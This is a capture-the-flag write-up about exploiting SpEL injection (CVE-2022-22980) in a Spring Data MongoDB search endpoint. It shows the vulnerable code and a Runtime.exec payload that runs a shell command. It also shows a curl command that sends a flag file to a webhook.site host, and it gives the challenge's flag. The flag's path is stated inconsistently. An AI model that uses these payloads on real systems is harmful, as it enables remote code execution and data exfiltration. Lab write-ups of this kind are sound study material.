# SpELling it out - CTF Write-up

## Challenge Description
A HR platform where the company can know about the informations about the people who work there. While its a normal web app from outside we can access flag.txt which is residing in that particular server.


## Initial Analysis

Looking at the userRepository.java file:
```java
public interface UserRepository extends CrudRepository<User, String> {
    @Query("{ 'username': { $regex: ?#{?0} } }")
    List<User> findByUsernameContaining(String username);
}
```


Looking at the userController.java:
```java
@RestController
@RequestMapping("/api/users")
public class UserController {
    @Autowired
    private UserRepository userRepository;

    @GetMapping("/search")
    public ResponseEntity<?> searchUsers(@RequestParam String username) {
        try {
            String decodedUsername = new String(Base64.getUrlDecoder().decode(username));
            List<User> users = userRepository.findByUsernameContaining(decodedUsername);
            return ResponseEntity.ok(users);
        } catch (IllegalArgumentException e) {
            return ResponseEntity.badRequest().body("Invalid Base64 input for 'username'");
        } catch (Exception e) {
            return ResponseEntity.status(500).body("An unexpected error occurred:");
        }
    }
}
```




Key observations:
1. Uses @Query with ?#{?0} which is vulnerable to Spring expression language injection
2. By checking the version of Spring Boot Starter Data MongoDB from pom.xml its confirmed it is vulnerable
3. Confirmed with CVE-2022-22980
4. there is no way of getting any output from the application.


## Exploitation Steps

### 1. Confirming the vulnerability
First try lets try it parsing some SpEL code like 'abc'.replace('abc', 'john_doe') as your base64 encoded payload, if it then runs that particular payload and returns that one particular employee, then the vulnerable to SpEL injection


### 2. Crafting the Payload
We found that flag.txt is in the etc/flag.txt, so to cat out the flag, we can write a spring expression:
```bash
T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/sh", "-c", "cat /app/flag.txt"})
```

### 3. Getting the Flag
We know there is no way to get any output, but we can send out the payload as a get request somewhere and recieve it, and finally get the flag, so we can use something like:
```bash
T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/sh", "-c", "curl -X POST https://webhook.site/6300846b-3722-46a5-9451-9eee5cfc45ec -d flag=$(cat /etc/flag.txt)"})
```
encode this payload and get the flag in the webhook site.

## Tools Used
- Burp Suite/Postman for requests
- Java knowledge for crafting the payload

## Flag
`p_ctf{y0u_FiN4l1y_F0uNd_hOw_To_SpEL_iT}`